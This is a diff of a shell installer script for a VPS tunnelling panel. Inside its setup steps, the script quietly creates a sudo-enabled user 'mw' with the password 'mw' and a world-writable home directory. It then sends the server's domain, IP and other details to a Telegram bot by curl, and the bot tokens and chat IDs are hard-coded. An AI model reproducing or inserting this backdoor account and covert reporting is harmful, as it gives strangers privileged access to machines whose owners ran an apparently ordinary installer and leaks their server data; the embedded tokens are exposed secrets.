@@ -10,9 +10,9 @@ ISP=$(wget -qO- ipinfo.io/org)
 CITY=$(curl -s ipinfo.io/city)
 TIME=$(date +'%Y-%m-%d %H:%M:%S')
 RAMMS=$(free -m | awk 'NR==2 {print $2}')
-TIMES="10"
-CHATID="-1001956940889"
-KEY="5830417881:AAFwOFZKwPbDRUW-UUDrv60-xTzccSFTelU"
+CHATID="1942328282"
+KEY="6100079323:AAFSs4ovyrGGi039RySx0lzshGbB01nHM8k"
+TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 clear 
 BURIQ () {
@@ -236,6 +236,7 @@ echo "$SUB_DOMAIN" > /etc/xray/domain
 echo "$SUB_DOMAIN" > /etc/xray/scdomain
 echo "IP=$SUB_DOMAIN" > /var/lib/mwvpn-pro/ipvps.conf
 echo ""
+elif [[ $host == "2" ]]; then
 echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
 echo -e   "                  Pointing Domain VPS  "
 echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
@@ -288,7 +289,7 @@ echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━�
 echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
 echo "   DOMAIN = $SUB_DOMAIN "
 echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
-
+fi
 #THEME RED
 cat <<EOF>> /etc/mwstore/theme/red
 BG : \E[40;1;41m
@@ -367,19 +368,16 @@ echo "$expx" >/usr/bin/e
 username=$(cat /usr/bin/user)
 exp=$(cat /usr/bin/e)
 clear
-    userdel jame > /dev/null 2>&1
-    Username="mw"
-    Password=mw
-    mkdir -p /home/script/
-    chmod 777 /home/script/
-    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-    usermod -aG sudo $Username > /dev/null 2>&1
-    CHATID="1942328282"
-    KEY="6100079323:AAFSs4ovyrGGi039RySx0lzshGbB01nHM8k"
-    TIME="10"
-    URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT="𝗦𝘂𝗰𝗰𝗲𝘀 𝗮𝘁 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆
+userdel jame > /dev/null 2>&1
+Username="mw"
+Password=mw
+mkdir -p /home/script/
+chmod 777 /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
+TEXT="
+𝗦𝘂𝗰𝗰𝗲𝘀 𝗮𝘁 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆
     𝗩𝗣𝗦 𝗜𝗡𝗙𝗢
     ◇━━━━━━━━━━━━━━━━━━━━━━━◇
     <code>Domain     :</code> <code>$domain</code>
@@ -394,7 +392,7 @@ clear
 "
 
    curl -s --max-time $TIME -d "chat_id=$CHATID&disabley_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
-}
+
 cat> /root/.profile << END
 # ~/.profile: executed by Bourne-compatible login shells.
 
